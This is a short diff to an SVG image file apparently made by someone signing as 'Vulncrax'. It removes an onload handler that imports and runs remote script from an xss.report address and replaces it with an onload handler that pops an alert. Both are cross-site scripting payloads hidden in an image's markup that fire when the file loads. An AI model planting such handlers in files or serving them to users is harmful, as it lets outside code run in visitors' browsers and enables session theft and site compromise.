@@ -1,5 +1,4 @@
 <?xml version="1.0" encoding="UTF-8" standalone="no"?>
-<!-- Created By VULNCRAX | YOUTUBE: Vulncrax -->
 
 <svg
    version="1.1"
@@ -10,7 +9,7 @@
    xmlns:xlink="http://www.w3.org/1999/xlink"
    xmlns="http://www.w3.org/2000/svg"
    xmlns:svg="http://www.w3.org/2000/svg"
-   preserveAspectRatio="xMidYMid meet" onload="(import(/https:\xss.report\c\vulncrax/.source))//>">
+   preserveAspectRatio="xMidYMid meet" onload="alert('xxs By Vulncrax')">
   <defs
      id="defs39719">
     <linearGradient
